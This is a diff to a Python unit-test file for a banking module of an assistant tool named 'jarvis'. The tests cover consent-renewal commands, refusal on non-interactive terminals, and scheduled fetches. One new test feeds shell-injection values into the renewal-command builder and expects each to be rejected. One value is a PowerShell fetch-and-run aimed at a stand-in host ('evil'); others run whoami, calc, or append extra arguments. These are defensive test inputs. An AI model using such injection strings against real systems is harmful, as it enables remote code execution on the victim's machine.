@@ -181,7 +181,13 @@ class ViewTest(FetchTest):
         v = banking.view(limit=1)
         self.assertEqual(v["accounts"], [{"bank": "Crédit Mutuel", "name": "Compte ••2345", "currency": "EUR", "balance": 1234.56}])
         self.assertEqual([(t["label"], t["account"], t["currency"]) for t in v["transactions"]], [("SALAIRE", "Crédit Mutuel · Compte ••2345", "EUR")])
+        self.assertEqual(v["consent"], [{"bank": "Crédit Mutuel", "days_left": None, "renew": 'python -m jarvis bank link "Crédit Mutuel"'}])
         self.assertNotIn("u1", json.dumps(v))
+
+    def test_commande_de_renouvellement_filtree(self):
+        self.assertEqual(banking.renew_cmd("Trade Republic", "DE"), 'python -m jarvis bank link "Trade Republic" DE')
+        for bank, country in (('X$(iwr evil|iex)', "FR"), ("X`whoami`", "FR"), ('X" ; calc', "FR"), ("Banque", "fr;x")):
+            self.assertIsNone(banking.renew_cmd(bank, country))
 
     def test_coffre_indisponible_vue_absente(self):
         import keyring.errors
@@ -217,11 +223,18 @@ class CliTest(BankBase):
         return code, [(r[2], r[5]) for r in audit.last(5)]  # (outil, décision)
 
     def test_terminal_non_interactif_refuse_et_journalise(self):
-        with mock.patch.object(banking, "fetch") as fetch:
-            code, rows = self.run_cli(["bank", "fetch"], tty=False)
-        self.assertEqual(code, 1)
-        fetch.assert_not_called()
-        self.assertIn(("bank_fetch", "refusé"), rows)
+        with mock.patch.object(banking, "start_link") as link, mock.patch.object(banking, "configure") as key:
+            self.assertEqual(self.run_cli(["bank", "link", "X"], tty=False), (1, [("bank_link", "refusé")]))
+            self.assertEqual(self.run_cli(["bank", "key", "a", "f.pem", "https://x.fr"], tty=False)[0], 1)
+        link.assert_not_called()
+        key.assert_not_called()
+
+    def test_fetch_planifie_sans_stdin(self):  # tâche planifiée sous pythonw : sys.stdin vaut None
+        with mock.patch.object(banking, "fetch", return_value={"accounts": 1, "transactions": 0, "errors": []}), \
+                mock.patch.object(cli.sys, "stdin", None), mock.patch("builtins.print"):
+            audit = Audit(":memory:")
+            self.assertEqual(cli.bank_cmd(["bank", "fetch"], audit), 0)
+        self.assertEqual(audit.last(1)[0][2], "bank_fetch")
 
     def test_fetch_journalise_succes_et_echec(self):
         with mock.patch.object(banking, "fetch", return_value={"accounts": 1, "transactions": 3, "errors": []}):
